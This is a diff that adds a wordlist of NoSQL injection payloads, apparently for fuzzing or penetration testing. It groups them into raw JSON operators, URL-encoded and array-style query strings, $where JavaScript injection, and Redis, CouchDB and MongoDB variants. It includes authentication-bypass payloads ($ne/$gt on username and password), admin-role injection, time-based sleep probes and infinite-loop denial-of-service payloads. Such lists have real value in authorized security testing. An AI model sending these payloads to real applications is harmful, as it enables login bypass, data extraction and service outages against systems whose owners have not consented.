@@ -1,0 +1,54 @@
+# Generic NoSQL injection advanced payloads
+{"$gt":""}
+{"$ne":null}
+{"$ne":""}
+{"$regex":".*"}
+{"$where":"this.password.length > 0"}
+{"$where":"sleep(5000)"}
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"admin":true}
+{"role":"admin"}
+{"$or":[{},{"admin":true}]}
+[$ne]=1
+[$gt]=
+[$regex]=.*
+' || '1'=='1
+true, $where: '1 == 1'
+# URL-encoded NoSQL injection
+%7b%22%24ne%22%3anull%7d
+%7b%22%24gt%22%3a%22%22%7d
+%7b%22%24regex%22%3a%22.*%22%7d
+[$ne][0]=invalid&[$ne][1]=invalid
+# Query parameter array-style
+username[$ne]=invalid&password[$ne]=invalid
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+# JavaScript injection via $where
+{"$where":"function(){return true}"}
+{"$where":"this.username=='admin'&&this.password.match(/.*/)"}
+{"$where":"d=new Date;do{n=new Date;}while(n-d<5000);1"}
+# Type coercion
+{"username":{"$type":2},"password":{"$type":2}}
+# Aggregation injection
+{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"result"}}
+# JSON body variants (multipart bypass)
+{"username":{"$ne":"x"},"password":{"$ne":"x"}}
+{"username":{"$in":["admin","root","administrator"]},"password":{"$gt":""}}
+# Redis injection style
+*1\r\n$4\r\nINFO\r\n
+# CouchDB injection
+{"selector":{"_id":{"$gt":null}}}
+# MongoDB map-reduce injection
+{"$where":"function(){var r=''; for(var k in this){r+=k+',';}return r;}"}
+# Array operators
+{"field":{"$all":["value"]}}
+{"field":{"$elemMatch":{"key":"value"}}}
+{"field":{"$size":0}}
+# Evaluation operators
+{"$expr":{"$eq":["$password","$username"]}}
+# Denial of service
+{"$where":"while(true){}"}
+{"$where":"(function(){var d=new Date();while((new Date()-d)<5000);}())"}
+# String from charcode injection
+{"$where":"String.fromCharCode(114,101,116,117,114,110,32,116,114,117,101)"}
